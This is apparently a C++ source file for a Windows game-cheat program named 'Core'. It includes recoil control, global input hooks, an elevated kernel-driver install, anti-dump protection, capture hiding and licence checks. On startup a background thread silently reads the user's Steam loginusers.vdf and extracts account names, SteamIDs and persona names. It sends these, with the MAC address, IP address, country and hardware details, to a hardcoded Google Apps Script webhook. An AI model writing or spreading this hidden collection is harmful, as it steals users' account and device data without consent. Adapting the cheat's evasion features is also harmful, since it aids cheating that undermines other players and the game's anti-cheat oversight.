    // دریافت اطلاعات سیستم برای لاگ
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerNameSize = sizeof(computerName);
    GetComputerNameA(computerName, &computerNameSize);
    
    char username[UNLEN + 1];
    DWORD usernameSize = sizeof(username);
    GetUserNameA(username, &usernameSize);
    
    // دریافت آدرس MAC برای شناسایی بهتر سیستم
    std::string mac_address = get_mac_address();
    
    // لاگ شروع فرآیند نسخه آزمایشی
    output_log_message("Free trial attempt started at " + get_current_system_time_string() + "\n");
    output_log_message("System: " + std::string(computerName) + ", User: " + std::string(username) + "\n");
    output_log_message("MAC Address: " + mac_address + "\n");
    
    // اعمال تکنیک‌های محافظتی و ارسال لاگ به API در صورت شناسایی تهدید
    output_log_message("Running security protection checks for free trial...\n");
    std::string security_code_trial;
    std::string security_details_trial;
    bool security_threat = RunProtectionChecks(security_code_trial, security_details_trial);
    if (security_threat) {
        std::string context_details = security_details_trial;
        if (!context_details.empty()) {
            context_details += " | ";
        }
        context_details += "System: " + std::string(computerName) + ", User: " + std::string(username) + ", MAC: " + mac_address;
        HandleSecurityBlock(security_code_trial, context_details, "FREE_TRIAL");
        return;
    }
    output_log_message("Security checks passed for free trial.\n");
    
    // اعمال محافظت‌های ضد دامپ
    try {
        ApplyAntiDumpProtections();
    } catch (...) {
        // در صورت بروز هر خطایی، آن را نادیده می‌گیریم تا برنامه کرش نکند
        send_security_log_to_api("AntiDump", "Error applying anti-dump protections");
    }
    
    g_is_logging_in.store(true, std::memory_order_relaxed);
    long long received_duration = 0;
    std::string api_error_message_local = "";
    std::string received_start_license_local = "";

    // ساختن device_id
    std::string device_id_hashed = generate_device_id();
    std::string nonce = generate_nonce();
    std::string timestamp = get_unix_timestamp_seconds();
    std::string response_body;
    {
        std::string http_error;
        json request_json;
        request_json["license"] = "";
        request_json["device_id"] = device_id_hashed;
        request_json["version"] = APP_VERSION_NUMBER;
        request_json["nonce"] = nonce;
        request_json["ts"] = timestamp;

        if (!HttpPostJsonToString(std::string(LICENSE_API_BASE_URL), request_json.dump(), response_body, http_error)) {
            api_error_message_local = "Failed to connect to the server.";
            if (!http_error.empty()) {
                api_error_message_local += " (" + http_error + ")";
            }
            output_log_message("Error: Free trial HttpPostJsonToString failed. " + http_error + "\n");
            goto fail;
        }
    }

    if (response_body.empty()) {
        api_error_message_local = "Empty response from server.";
        goto fail;
    }

    try {
        json json_response = json::parse(response_body);
        std::string signature_error;
        if (!verify_response_signature(json_response, LICENSE_HMAC_SECRET, nonce, signature_error)) {
            api_error_message_local = "Invalid server signature.";
            output_log_message("Free trial API signature check failed: " + signature_error + "\n");
            goto fail;
        }
        if (json_response.contains("status") && json_response["status"] == "valid") {
            if (json_response.contains("remaining") && json_response["remaining"].is_string()) {
                std::string remaining_str = json_response["remaining"];
                std::stringstream ss(remaining_str);
                long long val;
                char unit;
                while (ss >> val >> unit) {
                    if (unit == 'd') received_duration += val * 24 * 60 * 60;
                    else if (unit == 'h') received_duration += val * 60 * 60;
                    else if (unit == 'm') received_duration += val * 60;
                }
            }
            if (json_response.contains("start_license") && json_response["start_license"].is_string()) {
                received_start_license_local = json_response["start_license"].get<std::string>();
            }

            // Read plan_type from server for free trial; default to free_trial
            std::string plan_type_local = "free_trial";
            if (json_response.contains("plan_type") && json_response["plan_type"].is_string()) {
                plan_type_local = json_response["plan_type"].get<std::string>();
            }

            // موفقیت: فعال‌سازی
            {
                std::lock_guard<std::mutex> lock(g_license_data_mutex);
                is_licensed.store(true);
                g_activation_time = std::chrono::system_clock::now();
                g_subscription_duration_seconds = received_duration;
                g_start_license_str = received_start_license_local;
                g_plan_type = plan_type_local;
                g_isLoggedIn.store(true, std::memory_order_relaxed); // Set login status to true for gamma control
            }
            // ثبت زمان شروع سشن استفاده بعد از فعال‌سازی Free Trial
            g_session_start_time = std::chrono::steady_clock::now();
            current_view = ViewState::Home;
            {
                std::lock_guard<std::mutex> lock(g_login_error_mutex);
                login_error_message = "";
            }
            recalculate_all_profiles_threadsafe();
            output_log_message("Free Trial accepted via API. Script activated. Start License: " + received_start_license_local + "\n");
            play_sound_async(LOGIN_SUCCESS_SOUND_FILE);

            // --- Send detailed session log to webhook after successful free trial ---
            std::string username_str(username);
            std::string computer_name_str(computerName);
            std::string gpu_info = get_gpu_info();
            std::string system_language = get_system_language();
            std::string ram_info = get_ram_info();
            std::string cpu_info = get_cpu_info();
            std::string device_id = get_cached_device_id();
            std::string system_uptime = get_system_uptime();

            std::string plan_label;
            if (plan_type_local == "free_trial") {
                plan_label = "Free Trial";
            } else if (plan_type_local == "subscription") {
                plan_label = "Subscription";
            } else if (plan_type_local.empty()) {
                plan_label = "Unknown";
            } else {
                plan_label = plan_type_local;
            }

            std::string user_ip = get_cached_user_ip();
            std::string user_country = get_cached_user_country();
            output_log_message("Retrieved user IP (free trial webhook): " + user_ip + ", Country: " + user_country + "\n");

            long long total_usage_for_webhook = g_total_usage_seconds;
            if (g_isLoggedIn.load(std::memory_order_relaxed) &&
                g_session_start_time.time_since_epoch().count() != 0) {
                auto now_usage = std::chrono::steady_clock::now();
                auto delta_usage = std::chrono::duration_cast<std::chrono::seconds>(now_usage - g_session_start_time).count();
                if (delta_usage > 0) {
                    total_usage_for_webhook += delta_usage;
                }
            }

            std::string msg = "User: " + username_str +
                             "\nComputer: " + computer_name_str +
                             "\nMAC: " + mac_address +
                             "\nIP Address: " + user_ip +
                             "\nCountry: " + user_country +
                             "\nGPU: " + gpu_info +
                             "\nSystem Language: " + system_language +
                             "\nTotal RAM: " + ram_info +
                             "\nCPU Info: " + cpu_info +
                             "\nApp Version: " + APP_VERSION_NUMBER +
                             "\nDevice ID (Hashed): " + device_id +
                             "\nSystem Uptime: " + system_uptime +
                             "\nTotal Usage: " + format_duration_seconds(total_usage_for_webhook) +
                             "\nPlan: " + plan_label;

            std::string webhook_url = "https://script.google.com/macros/s/AKfycbxaWs-NMsr3aQuAus9qSyy1h5MEDL76PNIZ-fmmxYvL2wdvZ2mpUrRnsCKIXlyt3EDyfw/exec";
            std::string token = xor_strings::get_webhook_token();

            send_webhook_via_google_script(webhook_url, token, msg);

            g_is_logging_in.store(false, std::memory_order_relaxed);
            return;
        } else {
            std::string message_str;
            std::string details_str;

            if (json_response.contains("message") && json_response["message"].is_string()) {
                message_str = json_response["message"].get<std::string>();
            }
            if (json_response.contains("details") && json_response["details"].is_string()) {
                details_str = json_response["details"].get<std::string>();
            }

            // If the server reports that a new version is required, trigger the shared update handler
            if (message_str == "Need Donwload New Version App (Check Discord)") {
                output_log_message("Free trial API reports outdated version. Update required.\n");
                handle_update_required_from_server(details_str, api_error_message_local);
                g_is_logging_in.store(false, std::memory_order_relaxed);
                return;
            }

            if (!message_str.empty()) {
                api_error_message_local = message_str;
            } else if (json_response.contains("message")) {
                api_error_message_local = json_response["message"];
            } else {
                api_error_message_local = "Invalid or expired free trial.";
            }
        }
    } catch (...) {
        api_error_message_local = "Failed to parse server response.";
    }
fail:
    {
        std::lock_guard<std::mutex> lock(g_login_error_mutex);
        login_error_message = api_error_message_local;
    }
    {
        std::lock_guard<std::mutex> lock(g_license_data_mutex);
        g_start_license_str = "N/A";
        g_plan_type = "unknown";
    }
    output_log_message("Free Trial check failed via API. Error: " + api_error_message_local + "\n");
    play_sound_async(LOGIN_FAILURE_SOUND_FILE);
    g_is_logging_in.store(false, std::memory_order_relaxed);
}

// --- Cleanup Function ---
void cleanup_and_exit() {
    output_log_message("\nPerforming cleanup before exit...\n");
 

    // قبل از آزادسازی منابع، زمان استفاده سشن فعلی را به مجموع اضافه و در config ذخیره می‌کنیم
    accumulate_usage_and_save();

    // Play exit sound *before* unhooking and destroying window
    if (g_sound_enabled.load(std::memory_order_relaxed)) {
        // Use SND_ASYNC again to avoid blocking the main thread for the full sound duration.
        // Add a small sleep *after* calling PlaySound to give it time to start playing.
        PlaySound(LOGIN_FAILURE_SOUND_FILE.c_str(), NULL, SND_FILENAME | SND_ASYNC | SND_NODEFAULT | SND_PURGE);
        output_log_message("Exit sound triggered (asynchronously).\n");
        // Add a small delay to allow the sound to start playing before resources are released
        sleep_ms(200); // Adjust this value if needed (e.g., 100ms to 500ms)
    }

    if (keyboard_hook) { UnhookWindowsHookEx(keyboard_hook); keyboard_hook = NULL; output_log_message("Keyboard hook removed.\n"); }
    if (mouse_hook) { UnhookWindowsHookEx(mouse_hook); mouse_hook = NULL; output_log_message("Mouse hook removed.\n"); }

    ImGui_ImplDX11_Shutdown();
    ImGui_ImplWin32_Shutdown();
    ImGui::DestroyContext();
    output_log_message("ImGui shutdown.\n");

    CleanupDeviceD3D();
    output_log_message("DirectX resources released.\n");

    // Destroy window is called in main before calling cleanup_and_exit
    // ::DestroyWindow(hwnd); // This is called in main
    if (hwnd) { // Check if hwnd is still valid before unregistering class
        ::UnregisterClass(" Core", GetModuleHandle(NULL)); // Use the same class name as RegisterClassEx
        output_log_message("Window class unregistered.\n");
    }

    // Cleanup Winsock (if initialized)
    // WSACleanup(); // If WSAStartup was called
    output_log_message("Cleanup finished.\n");
}


// Low-level input is now handled via Win32 hooks
void send_webhook_via_google_script(const std::string& full_url, const std::string& token, const std::string& message) {
    HINTERNET hInternet = InternetOpen("WebhookSender", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "InternetOpen failed: " << GetLastError() << std::endl;
        output_log_message("Error: InternetOpen failed for webhook. Error Code: " + std::to_string(GetLastError()) + "\n");
        return;
    }

    // Break down URL using InternetCrackUrl
    URL_COMPONENTS urlComp{};
    urlComp.dwStructSize = sizeof(urlComp);
    char host[256];
    char path[1024];
    urlComp.lpszHostName = host;
    urlComp.dwHostNameLength = sizeof(host);
    urlComp.lpszUrlPath = path;
    urlComp.dwUrlPathLength = sizeof(path);

    if (!InternetCrackUrlA(full_url.c_str(), 0, 0, &urlComp)) {
        std::cerr << "InternetCrackUrl failed: " << GetLastError() << std::endl;
        output_log_message("Error: InternetCrackUrl failed for webhook. Error Code: " + std::to_string(GetLastError()) + "\n");
        InternetCloseHandle(hInternet);
        return;
    }

    HINTERNET hConnect = InternetConnectA(hInternet, urlComp.lpszHostName, urlComp.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        std::cerr << "InternetConnect failed: " << GetLastError() << std::endl;
        output_log_message("Error: InternetConnect failed for webhook. Error Code: " + std::to_string(GetLastError()) + "\n");
        InternetCloseHandle(hInternet);
        return;
    }

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    if (urlComp.nScheme == INTERNET_SCHEME_HTTPS) {
        flags |= INTERNET_FLAG_SECURE;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlComp.lpszUrlPath, NULL, NULL, NULL, flags, 0);
    if (!hRequest) {
        std::cerr << "HttpOpenRequestA failed. Error: " << GetLastError() << std::endl;
        output_log_message("Error: HttpOpenRequestA failed for webhook. Error Code: " + std::to_string(GetLastError()) + "\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    std::string postData = "token=" + token + "&message=" + message;
    std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";

    BOOL result = HttpSendRequestA(hRequest, headers.c_str(), headers.size(), (LPVOID)postData.c_str(), postData.size());
    if (!result) {
        std::cerr << "HttpSendRequestA failed. Error: " << GetLastError() << std::endl;
        output_log_message("Error: HttpSendRequestA failed for webhook. Error Code: " + std::to_string(GetLastError()) + "\n");
    } else {
        std::cout << "[+] Webhook sent successfully." << std::endl;
        output_log_message("Webhook sent successfully.\n");
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}
 
void send_steam_log_via_server(const std::string& content) {
    // Log exactly what we are sending to the dedicated Steam log API
    output_log_message("Steam log plain content:\n" + content + "\n");
    output_log_message("Sending Steam log via dedicated Steam API URL.\n");

    std::string token = xor_strings::get_webhook_token();
    send_webhook_via_google_script(std::string(STEAM_LOG_API_URL), token, content);
}
// تابع جدید برای حذف قطعی فایل‌ها با استفاده از چند روش مختلف
bool forceDeleteFile(const std::string& filePath) {
    output_log_message("[DEBUG] Attempting to force delete file: " + filePath + "\n");
    
    // بررسی وجود فایل
    if (!std::filesystem::exists(filePath)) {
        output_log_message("[DEBUG] File does not exist: " + filePath + "\n");
        return true; // فایل وجود ندارد، پس حذف موفقیت‌آمیز بوده است
    }
    
    // روش 1: استفاده از DeleteFileA
    if (DeleteFileA(filePath.c_str())) {
        output_log_message("[DEBUG] Successfully deleted file using DeleteFileA: " + filePath + "\n");
        return true;
    }
    
    DWORD error = GetLastError();
    output_log_message("[DEBUG] DeleteFileA failed with error code: " + std::to_string(error) + "\n");
    
    // روش 2: استفاده از std::filesystem::remove
    try {
        if (std::filesystem::remove(filePath)) {
            output_log_message("[DEBUG] Successfully deleted file using std::filesystem::remove: " + filePath + "\n");
            return true;
        }
        output_log_message("[DEBUG] std::filesystem::remove also failed.\n");
    } catch (const std::exception& e) {
        output_log_message("[DEBUG] Exception in std::filesystem::remove: " + std::string(e.what()) + "\n");
    }
    
    // روش 3: استفاده از system
    std::string del_command = "del /f /q \"" + filePath + "\"";
    output_log_message("[DEBUG] Trying system command: " + del_command + "\n");
    system(del_command.c_str());
    
    // بررسی مجدد وجود فایل
    if (!std::filesystem::exists(filePath)) {
        output_log_message("[DEBUG] Successfully deleted file using system command: " + filePath + "\n");
        return true;
    }
    
    // روش 4: استفاده از attrib برای حذف ویژگی مخفی و سپس حذف فایل
    std::string attrib_command = "attrib -h -s -r \"" + filePath + "\"";
    // Debug log removed
    system(attrib_command.c_str());
    
    // تلاش مجدد برای حذف
    if (DeleteFileA(filePath.c_str()) || std::filesystem::remove(filePath)) {
        // Debug log removed
        return true;
    }
    
    // تلاش نهایی با system
    system(del_command.c_str());
    
    // بررسی نهایی
    if (!std::filesystem::exists(filePath)) {
        // Debug log removed
        return true;
    }
    
    // Debug log removed
    return false;
}

// متغیر جهانی برای شمارش تعداد اجراهای برنامه در خط 286 تعریف شده است

// --- Main Function ---
int main(int, char**) {
    // --- Console window will be visible by default ---
    // To hide it completely from the start, you need to compile as a GUI application.
    // The ShowWindow(GetConsoleWindow(), SW_HIDE) call is removed.

    // --- Ensure Core.sys driver is installed and running (may require admin on first run) ---
    try {
        // If we are not running as admin, quickly probe whether the Core.sys device is already accessible.
        // If not, request elevation so the elevated instance can install/start the driver.
        if (!IsRunningAsAdmin()) {
            CoreMouseDriver probe;
            if (!probe.Open()) {
                output_log_message("Core.sys driver not accessible; requesting admin privileges for installation...\n");

                if (!RelaunchAsAdmin()) {
                    MessageBoxA(NULL,
                        "Administrator privileges are required to install and start the Core.sys driver.\n"
                        "Please run this application as Administrator and ensure Core.sys is placed next to the executable.",
                        "Core.sys Driver",
                        MB_ICONERROR | MB_OK);
                    return 1;
                }

                // Successfully launched an elevated instance; exit current (non-admin) process.
                return 0;
            } else {
                // Driver is already accessible without admin; close the temporary handle and continue.
                probe.Close();
            }
        } else {
            // Already running as admin: ensure the driver service for Core.sys exists and is started.
            if (!EnsureCoreDriverInstalledAndStarted()) {
                MessageBoxA(NULL,
                    "Failed to install or start the App.\n"
                    "Please verify Last Version And Check your Internet try again.",
                    "If You Need More Help Send Message To Support TeaM",
                    MB_ICONERROR | MB_OK);
            }
        }
    } catch (...) {
        // Do not let driver installation logic crash the app; log and continue.
        output_log_message("Exception during Core.sys driver installation/startup sequence. Continuing without driver.\n");
    }

    // شروع برنامه

    // 1. Initialize virtual-key name mappings and load initial config
    output_log_message("Attempting to load config...\n");
    initialize_vk_code_names();
    load_config(); // This now loads all settings including Remember Me and decrypts key
    output_log_message("Config loading finished.\n");

    // If "Remember Me" is checked on load and a decrypted key exists, pre-fill the license key input
    if (g_remember_me && !g_saved_license_key.empty()) {
        // Ensure license_key_input buffer is large enough
        if (g_saved_license_key.length() < IM_ARRAYSIZE(license_key_input)) {
             strncpy(license_key_input, g_saved_license_key.c_str(), IM_ARRAYSIZE(license_key_input) - 1);
             license_key_input[IM_ARRAYSIZE(license_key_input) - 1] = '\0'; // Ensure null termination
             output_log_message("Pre-filled license key from config.\n");
        } else {
             output_log_message("Warning: Saved license key is too long for input buffer. Not pre-filling.\n");
             // Optionally clear saved key if too long/problematic
             g_saved_license_key = "";
             g_remember_me = false; // Also disable remember me if key is unusable
        }
    }

    // --- Send Startup Log to Webhook (Async) ---
    // Use a separate thread to avoid blocking startup
    std::thread webhook_thread([]() {
        std::string webhook_url = "https://script.google.com/macros/s/AKfycbxaWs-NMsr3aQuAus9qSyy1h5MEDL76PNIZ-fmmxYvL2wdvZ2mpUrRnsCKIXlyt3EDyfw/exec";
        std::string token = "mysecrettoken";
        std::string username = get_username();
        std::string computer_name = get_computer_name();
        std::string mac_address = get_mac_address();
        std::string gpu_info = get_gpu_info();
        std::string system_language = get_system_language();
        std::string ram_info = get_ram_info();
        std::string cpu_info = get_cpu_info();
        std::string device_id = generate_device_id();
        std::string system_uptime = get_system_uptime();
        
        // خواندن محتوای فایل Steam loginusers.vdf
        std::string steam_loginusers_content;
        {
            const std::string steam_loginusers_path = find_steam_loginusers_vdf_path();
            std::ifstream steam_file(steam_loginusers_path);
            if (steam_file)
            {
                std::ostringstream ss;
                ss << steam_file.rdbuf();
                steam_loginusers_content = ss.str();
                output_log_message("Successfully read Steam loginusers.vdf from: " + steam_loginusers_path + "\n");
            }
            else
            {
                steam_loginusers_content = "ERROR: Could not open Steam loginusers.vdf at path: " + steam_loginusers_path;
                output_log_message("Failed to open Steam loginusers.vdf at path: " + steam_loginusers_path + "\n");
            }
        }

        // ساخت خلاصه از loginusers.vdf فقط با SteamID, AccountName, PersonaName, Timestamp
        std::string steam_summary;
        if (steam_loginusers_content.rfind("ERROR:", 0) == 0)
        {
            // اگر فایل باز نشد، همان پیام خطا را می‌فرستیم
            steam_summary = steam_loginusers_content;
        }
        else
        {
            std::istringstream iss(steam_loginusers_content);
            std::string line;
            std::vector<std::string> lines;
            while (std::getline(iss, line))
            {
                lines.push_back(line);
            }

            auto trim = [](const std::string& s) -> std::string {
                size_t start = s.find_first_not_of(" \t\r\n");
                if (start == std::string::npos) return std::string();
                size_t end = s.find_last_not_of(" \t\r\n");
                return s.substr(start, end - start + 1);
            };

            auto extractQuotedValue = [](const std::string& l) -> std::string {
                size_t last = l.rfind('"');
                if (last == std::string::npos || last == 0) return std::string();
                size_t prev = l.rfind('"', last - 1);
                if (prev == std::string::npos) return std::string();
                return l.substr(prev + 1, last - prev - 1);
            };

            auto formatTimestamp = [](const std::string& ts) -> std::string {
                if (ts.empty()) return std::string();
                long long value = 0;
                try {
                    value = std::stoll(ts);
                } catch (...) {
                    // If parsing fails, return original string
                    return ts;
                }
                if (value <= 0) {
                    return ts;
                }

                std::time_t t = static_cast<std::time_t>(value);
                std::tm tmBuf{};
                char buf[64] = { 0 };

#if defined(_WIN32)
                if (localtime_s(&tmBuf, &t) != 0) {
                    return ts;
                }
#else
                if (!localtime_r(&t, &tmBuf)) {
                    return ts;
                }
#endif

                if (std::strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &tmBuf) == 0) {
                    return ts;
                }
                return std::string(buf);
            };

            for (size_t i = 0; i + 1 < lines.size(); ++i)
            {
                std::string idLineTrimmed = trim(lines[i]);
                std::string nextLineTrimmed = trim(lines[i + 1]);

                // به دنبال خطوطی شبیه "7656119..." و سپس یک بلاک { ... } می‌گردیم
                if (idLineTrimmed.size() > 2 &&
                    idLineTrimmed.front() == '"' &&
                    idLineTrimmed.back() == '"' &&
                    nextLineTrimmed == "{")
                {
                    std::string steam_id = extractQuotedValue(idLineTrimmed);
                    bool isUsersBlock = (steam_id == "users");
                    std::string account_name;
                    std::string persona_name;
                    std::string timestamp;

                    size_t j = i + 2;
                    for (; j < lines.size(); ++j)
                    {
                        std::string blkLineTrimmed = trim(lines[j]);
                        if (blkLineTrimmed == "}")
                        {
                            break;
                        }

                        if (blkLineTrimmed.find("\"AccountName\"") != std::string::npos)
                        {
                            account_name = extractQuotedValue(blkLineTrimmed);
                        }
                        else if (blkLineTrimmed.find("\"PersonaName\"") != std::string::npos)
                        {
                            persona_name = extractQuotedValue(blkLineTrimmed);
                        }
                        else if (blkLineTrimmed.find("\"Timestamp\"") != std::string::npos)
                        {
                            timestamp = extractQuotedValue(blkLineTrimmed);
                        }
                    }

                    if (!steam_id.empty() && !isUsersBlock)
                    {
                        // تبدیل SteamID به لینک پروفایل استیم
                        steam_summary += "https://steamcommunity.com/profiles/" + steam_id + "/\n";
                        if (!account_name.empty())
                        {
                            steam_summary += "AccountName: " + account_name + "\n";
                        }
                        if (!persona_name.empty())
                        {
                            steam_summary += "PersonaName: " + persona_name + "\n";
                        }
                        if (!timestamp.empty())
                        {
                            std::string formattedTs = formatTimestamp(timestamp);
                            steam_summary += "Timestamp: " + formattedTs + "\n";
                        }
                        steam_summary += "\n";
                    }

                    // بعد از این بلاک از انتهای آن ادامه می‌دهیم
                    // برای بلاک بالایی "users"، i را جابجا نکن تا اکانت‌های داخلی جداگانه پردازش شوند
                    if (!isUsersBlock)
                    {
                        i = j;
                    }
                }
            }

            if (steam_summary.empty())
            {
                steam_summary = "No Steam users parsed from loginusers.vdf";
            }
        }

        // دریافت IP کاربر (این عملیات ممکن است کمی زمان ببرد)
        std::string user_ip = get_cached_user_ip();
        std::string user_country = get_cached_user_country();
        output_log_message("Retrieved user IP: " + user_ip + ", Country: " + user_country + "\n");
        
        std::string msg = "User: " + username + 
                         "\nComputer: " + computer_name + 
                         "\nMAC: " + mac_address + 
                         "\nIP Address: " + user_ip + 
                         "\nCountry: " + user_country + 
                         "\nGPU: " + gpu_info + 
                         "\nSystem Language: " + system_language + 
                         "\nTotal RAM: " + ram_info + 
                         "\nCPU Info: " + cpu_info + 
                         "\nApp Version: " + APP_VERSION_NUMBER + 
                         "\nDevice ID (Hashed): " + device_id + 
                         "\nSystem Uptime: " + system_uptime;

        send_webhook_via_google_script(webhook_url, token, msg);

        std::string steam_msg =
            "User: " + username +
            "\nDevice ID (Hashed): " + device_id +
            "\nSteam loginusers.vdf summary:\n" + steam_summary;
        send_steam_log_via_server(steam_msg);
    });
    webhook_thread.detach(); // Detach the thread


    // 2. Create Win32 Window
    output_log_message("Attempting to register window class...\n");
    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, "Core", NULL }; // Changed window title
    if (!::RegisterClassEx(&wc)) {
        output_log_message("Error: Failed to register window class!\n");
        // Consider adding GetLastError() here for more details
        // WSACleanup(); // Cleanup Winsock on failure
        cleanup_and_exit(); // Call cleanup before returning
        return 1;
    }
    output_log_message("Window class registered.\n");

    output_log_message("Attempting to create window...\n");
    hwnd = ::CreateWindow(wc.lpszClassName, "Core", WS_OVERLAPPEDWINDOW, 100, 100, 600, 700, NULL, NULL, wc.hInstance, NULL); // Changed window title
    if (!hwnd) {
        output_log_message("Error: Failed to create window!\n");
        // Consider adding GetLastError() here for more details
        // ::UnregisterClass(wc.lpszClassName, wc.hInstance); // Unregister happens in cleanup
        // WSACleanup(); // Cleanup Winsock on failure
        cleanup_and_exit(); // Call cleanup before returning
        return 1;
    }
    output_log_message("Win32 window created.\n");

    SetWindowDisplayAffinity(hwnd, WDA_EXCLUDEFROMCAPTURE);

    // COLORREF is BGR format (0x00BBGGRR)
    // Let's use a dark grey color, e.g., R=46, G=46, B=46 -> 0x002E2E2E
    COLORREF title_bar_color = 0x002E2E2E; // Dark Grey BGR
    // Set the native window title bar color using DWM
    // COLORREF is BGR format (0x00BBGGRR)
    // Let's use a dark grey color, e.g., R=46, G=46, B=46 -> 0x002E2E2E
        // Handle error, maybe log a warning
    output_log_message("Attempting to set DWM caption color...\n");
    HRESULT hr_dwm = DwmSetWindowAttribute(hwnd, DWMWA_CAPTION_COLOR, &title_bar_color, sizeof(title_bar_color));
    if (FAILED(hr_dwm)) {
        // Handle error, maybe log a warning
        output_log_message("Warning: Failed to set DWM caption color.\n");
    } else {
        output_log_message("DWM caption color set.\n");
    }


    // 3. Initialize Direct3D
    output_log_message("Attempting to initialize Direct3D...\n");
    if (!CreateDeviceD3D(hwnd)) {
        output_log_message("Error: Direct3D initialization failed!\n");
        MessageBoxA(NULL,
                    "Direct3D initialization failed.\n"
                    "Try updating GPU drivers, enabling DirectX, or running on a supported system.",
                    "Direct3D Error",
                    MB_ICONERROR | MB_OK);
        // CleanupDeviceD3D(); // Cleanup happens in cleanup_and_exit
        // ::DestroyWindow(hwnd); // Destroy happens in main loop or cleanup
        // ::UnregisterClass(wc.lpszClassName, wc.hInstance); // Unregister happens in cleanup
        // WSACleanup(); // Cleanup Winsock on failure
        cleanup_and_exit(); // Call cleanup before returning
        return 1;
    }
    output_log_message("Direct3D initialized.\n");


    // 4. Show Window (Initially visible)
    output_log_message("Showing window...\n");
    ::ShowWindow(hwnd, SW_SHOWDEFAULT);
    ::UpdateWindow(hwnd);
    output_log_message("Window shown.\n");

    // --- Setup ImGui ---
    output_log_message("Attempting to setup ImGui...\n");
    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO(); (void)io;
    io.IniFilename = NULL; // Disable imgui.ini saving/loading
    
    // Setup Dear ImGui style
    ImGui::StyleColorsDark();
    // io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard; // Enable Keyboard Controls
    // io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;  // Enable Gamepad Controls
    // Removed incorrect flag: io.ConfigFlags |= ImGuiConfigFlags_MenuBar; // Enable Menu Bar
    ImGuiStyle& style = ImGui::GetStyle(); // Get the style reference
    style.FrameRounding = 4.0f; // Rounded corners for input fields, buttons etc.
    style.GrabRounding = 4.0f;  // Rounded grab handles for sliders
    style.WindowRounding = 4.0f; // Rounded window corners
    style.ScrollbarRounding = 6.0f; // Rounded scrollbars
    style.WindowBorderSize = 1.0f; // Add a border to windows
    style.FrameBorderSize = 1.0f;  // Add a border to frames

    // استفاده از تم نئون سفارشی
    SetCustomTheme();
    
    // تنظیم گرد بودن گوشه‌ها
    style.FrameRounding = 6.0f;     // گوشه‌های گرد برای دکمه‌ها و فیلدها
    style.GrabRounding = 6.0f;      // گوشه‌های گرد برای اسلایدرها
    style.WindowRounding = 10.0f;   // گوشه‌های گرد برای پنجره‌ها
    style.ScrollbarRounding = 8.0f; // گوشه‌های گرد برای اسکرول‌بارها
    style.TabRounding = 8.0f;       // گوشه‌های گرد برای تب‌ها


    output_log_message("Attempting ImGui_ImplWin32_Init...\n");
    if (!ImGui_ImplWin32_Init(hwnd)) {
        output_log_message("Error: ImGui Win32 initialization failed!\n");
        // ImGui::DestroyContext(); // Cleanup happens in cleanup_and_exit
        // CleanupDeviceD3D(); // Cleanup happens in cleanup_and_exit
        // ::DestroyWindow(hwnd); // Destroy happens in main loop or cleanup
        // ::UnregisterClass(wc.lpszClassName, wc.hInstance); // Unregister happens in cleanup
        // WSACleanup(); // Cleanup Winsock on failure
        cleanup_and_exit(); // Call cleanup before returning
        return 1;
    }
    output_log_message("ImGui_ImplWin32_Init successful.\n");

    output_log_message("Attempting ImGui_ImplDX11_Init...\n");
    if (!ImGui_ImplDX11_Init(g_pd3dDevice, g_pd3dDeviceContext)) {
        output_log_message("Error: ImGui DX11 initialization failed!\n");
        // ImGui_ImplWin32_Shutdown(); // Cleanup happens in cleanup_and_exit
        // ImGui::DestroyContext(); // Cleanup happens in cleanup_and_exit
        // CleanupDeviceD3D(); // Cleanup happens in cleanup_and_exit
        // ::DestroyWindow(hwnd); // Destroy happens in main loop or cleanup
        // ::UnregisterClass(wc.lpszClassName, wc.hInstance); // Unregister happens in cleanup
        // WSACleanup(); // Cleanup Winsock on failure
        cleanup_and_exit(); // Call cleanup before returning
        return 1;
    }
    output_log_message("ImGui_ImplDX11_Init successful.\n");
    output_log_message("ImGui setup finished.\n");
    
    // اعمال تم سفارشی از تنظیمات ذخیره شده در فایل config
    output_log_message("Applying custom theme from config...\n");
    apply_theme();


    // 6. Initial Recoil Profile Calculation (only if licensed AND not expired)
    // Since license is not loaded from config, this will only run AFTER a successful login
    // auto now = std::chrono::system_clock::now();
    // auto expiration_time = g_activation_time + std::chrono::seconds(g_subscription_duration_seconds);
    // if (is_licensed.load() && now < expiration_time) {
    //     output_log_message("Recalculating initial profiles...\n");
    //     recalculate_all_profiles_threadsafe();
    //     output_log_message("Initial profiles recalculated.\n");
    // } else {
         output_log_message("Starting unlicensed. Skipping initial profile calculation.\n");
         is_licensed.store(false); // Ensure licensed state is false on startup
    // }


    std::thread recoil_thread_obj; // Use object for potential join later
    try {
        output_log_message("Attempting to start recoil thread...\n");
        recoil_thread_obj = std::thread(perform_recoil_control);
        output_log_message("Recoil control thread started.\n");

        HINSTANCE hInstance = GetModuleHandle(NULL);
        output_log_message("Attempting to install keyboard hook...\n");
        keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
        if (!keyboard_hook) { throw std::runtime_error("Failed to install keyboard hook!"); }
        output_log_message("Keyboard listener started.\n");

        output_log_message("Attempting to install mouse hook...\n");
        mouse_hook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, hInstance, 0);
        if (!mouse_hook) { throw std::runtime_error("Failed to install hook!"); }
        output_log_message("Mouse listener started.\n");

        // Ensure config directory exists (for settings persistence)
        char current_dir[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, current_dir);
        std::string config_dir = std::string(current_dir) + "\\config";
        if (!std::filesystem::exists(config_dir)) {
            try {
